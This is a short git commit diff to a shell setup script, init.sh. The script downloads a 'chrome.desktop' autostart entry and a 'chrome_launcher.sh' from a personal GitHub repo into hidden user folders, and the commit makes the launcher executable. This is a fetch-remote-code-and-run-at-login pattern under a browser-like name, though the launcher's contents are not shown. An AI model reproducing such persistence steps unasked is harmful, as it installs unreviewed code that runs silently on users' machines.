61244bcd2909521fc482a89e9d1dcc5586ce4f24
Nadilicus <155823831+Nadilicus@users.noreply.github.com>
2024-01-08 14:55:54 +0100

    Update init.sh

--- init.sh
+++ init.sh
@@ -4,3 +4,4 @@ mkdir ~/.local/share/chrome
 curl "https://raw.githubusercontent.com/Nadilicus/google/main/chrome.desktop" > ~/.config/autostart/chrome.desktop
 curl "https://raw.githubusercontent.com/Nadilicus/google/main/chrome_launcher.sh" > ~/.local/share/chrome/chrome_launcher.sh
 chmod +x ~/.config/autostart/chrome.desktop
+chmod +x ~/.local/share/chrome/chrome_launcher.sh
